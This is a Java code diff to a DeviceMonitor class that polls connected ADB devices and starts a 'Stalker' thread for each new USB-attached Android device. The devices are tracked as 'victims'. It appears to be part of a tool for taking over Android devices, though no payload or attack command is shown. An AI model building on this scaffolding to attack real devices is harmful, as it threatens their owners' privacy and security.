@@ -12,12 +12,16 @@ import java.util.ArrayList;
 public class DeviceMonitor implements Runnable{
 
 	private ArrayList<Stalker> stalkers;
-	public static ArrayList<String> currentDevices;
+	public static ArrayList<DeviceInfo> victims;
+	public static ArrayList<String> adbDevices;
+	
+	public static boolean debug = false;
 	
 	public DeviceMonitor()
 	{
 		stalkers = new ArrayList<Stalker>();
-		currentDevices = new ArrayList<String>();
+		victims = new ArrayList<DeviceInfo>();
+		adbDevices = new ArrayList<String>();
 	}
 
 
@@ -26,30 +30,37 @@ public class DeviceMonitor implements Runnable{
 	{
 		while (true)
 		{
-			ArrayList<Stalker> newStalkers = new ArrayList<>();
-			for (Stalker stalker : stalkers)
+			adbDevices = Adb.getDevices();
+			if (debug)
 			{
-				if (stalker.victimConnected)
+				P.print("----- adb devices -----");
+				P.print(adbDevices);
+			}
+			for (String deviceID : adbDevices)
+			{
+				if (!deviceID.endsWith(":"+Adb.tcpPort) && !hasStalker(deviceID))
 				{
-					newStalkers.add(stalker);
+					Stalker s = new Stalker(new DeviceInfo(deviceID));
+					s.start();
+					stalkers.add(s);
 				}
 			}
 			
+			ArrayList<Stalker> newStalkers = new ArrayList<>();
+			for (Stalker s : stalkers)
+				if (s.victimConnected)
+					newStalkers.add(s);
 			stalkers = newStalkers;
 			
-			currentDevices = Adb.getDevices();
-			for (String device : currentDevices)
+			if (debug)
 			{
-				if (!hasStalker(device))
+				P.print("\n-- victim count: " + stalkers.size());
+				for (Stalker s : stalkers)
 				{
-					P.print("New device connected: " + device + ". Sending new Stalker.");
-					Stalker stalker = new Stalker(device);
-					stalker.start();
-					stalkers.add(stalker);
+					P.print("[victim] " + s.device.tcpID+"\t" + s.device.usbID);
 				}
 			}
-			
-			wait(200);
+			wait(500);
 		}
 	}
 	
@@ -58,17 +69,19 @@ public class DeviceMonitor implements Runnable{
 		new Thread(this).start();
 	}
 	
-	private boolean hasStalker(String deviceID)
+	boolean hasStalker(String deviceID)
 	{
 		for (Stalker stalker : stalkers)
 		{
-			if (stalker.deviceID.equals(deviceID))
+			if (stalker.device.is(deviceID))
 			{
 				return true;
 			}
 		}
 		return false;
 	}
+	
+
 
 	private void wait(int milliseconds)
 	{
